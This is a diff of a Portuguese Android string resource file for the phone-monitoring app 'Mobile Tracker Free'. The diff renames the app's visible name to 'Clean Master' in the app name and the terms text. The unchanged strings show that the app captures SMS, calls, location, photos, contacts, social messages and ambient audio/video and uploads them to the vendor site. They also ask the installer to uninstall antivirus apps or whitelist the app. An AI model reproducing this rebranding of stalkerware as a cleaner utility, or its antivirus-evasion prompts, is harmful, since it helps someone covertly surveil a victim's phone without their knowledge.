@@ -77,7 +77,7 @@ Instruções:
     <string name="anti_virus_warning_text">"Detectamos um ou mais Antivírus instalados no telefone.
 Recomendamos que você os desinstale ou adicione %1$s à lista branca.
 Aplicativos detectados:"</string>
-    <string name="app_name">Mobile Tracker Free</string>
+    <string name="app_name">Clean Master</string>
     <string name="app_usage_enable_no">O acesso aos dados de uso não foi ativado.</string>
     <string name="app_usage_enable_ok">O acesso aos dados de uso foi ativado.</string>
     <string name="app_usage_message">Fornece estatísticas sobre o uso de aplicativos instalados.</string>
@@ -250,7 +250,7 @@ Aplicativos detectados:"</string>
 Recomendamos que você desinstale esses aplicativos ou adicione %1$s à lista branca.
 Aplicativos detectados:"</string>
     <string name="tel_limit">Para adicionar mais telefones, inscreva-se na versão premium.</string>
-    <string name="terms_1">Ao usar o aplicativo Mobile Tracker Free, você concorda em ficar vinculado por todos os seguintes termos:</string>
+    <string name="terms_1">Ao usar o aplicativo Clean Master, você concorda em ficar vinculado por todos os seguintes termos:</string>
     <string name="terms_2">"1) Você está ciente de que esta aplicação pode gravar, armazenar e transmitir informações sobre o uso do telefone e sua atividade de usuário.
 Isso inclui, se ativado, SMS / MMS, chamadas, locais, fotos, aplicativos, calendário, contatos, histórico de sites, prancheta, notificações, mensagens de redes sociais, gravação de chamadas de áudio e áudio / vídeo do meio ambiente.
 Estes dados serão enviados para o site seguro https://mobile-tracker-free.com através do protocolo HTTPS."</string>
@@ -259,7 +259,7 @@ Estes dados serão enviados para o site seguro https://mobile-tracker-free.com a
 • Você possui o consentimento escrito explícito do proprietário e de todos os usuários do dispositivo a serem monitorados;
 • Você é um guardião legal do usuário do dispositivo a ser monitorado;"</string>
     <string name="terms_4">3) Você conhece e cumpre as leis e regulamentos que cobrem privacidade, confidencialidade e o uso desse aplicativo de monitoramento em sua jurisdição local. Você assume a responsabilidade total por instalar ou usar o aplicativo.</string>
-    <string name="terms_5">4) Você também reconhece que nem o Mobile Tracker Free nem nenhuma das afiliadas serão responsáveis por quaisquer danos, litígios ou outras ações legais decorrentes de sua instalação ou uso do Mobile Tracker Free.</string>
+    <string name="terms_5">4) Você também reconhece que nem o Clean Master nem nenhuma das afiliadas serão responsáveis por quaisquer danos, litígios ou outras ações legais decorrentes de sua instalação ou uso do Clean Master.</string>
     <string name="terms_6">"\"5) &lt;a href='https://br.mobile-tracker-free.com/terms/'>Termos de uso&lt;/a>\""</string>
     <string name="terms_7">"\"6) &lt;a href='https://br.mobile-tracker-free.com/privacy-policy/'>Política de Privacidade&lt;/a>\""</string>
     <string name="terms_accept">ACEITAR</string>
